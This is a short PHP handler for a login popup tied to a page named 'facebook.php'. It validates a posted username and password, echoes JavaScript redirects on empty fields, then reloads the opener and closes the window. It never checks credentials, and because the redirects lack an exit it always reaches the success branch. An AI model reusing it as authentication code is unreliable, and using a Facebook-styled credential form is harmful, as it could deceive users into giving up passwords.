<?php 

	if (isset($_POST["submit"])) {

	function validate($data){
       $data = trim($data);
	   $data = stripslashes($data);
	   $data = htmlspecialchars($data);
	   return $data;
	}

	$user = validate($_POST['username']);
	$password = validate($_POST['password']);

		if(empty($user) && empty($password)){
			echo "<script> window.location='facebook.php?status=accountError'</script>";
		}

		if(empty($user)){
			echo "<script> window.location='facebook.php?status=usernameError'</script>";
		}

		if (empty($password)) {
			echo "<script> window.location='facebook.php?status=passwordError'</script>";
		}

			echo "<script type=\"text/javascript\" charset=\"utf-8\">window.opener.location = 'loadPage.php';</script>";
			echo "<script type=\"text/javascript\" charset=\"utf-8\">window.self.close()</script>";
		

	}


?>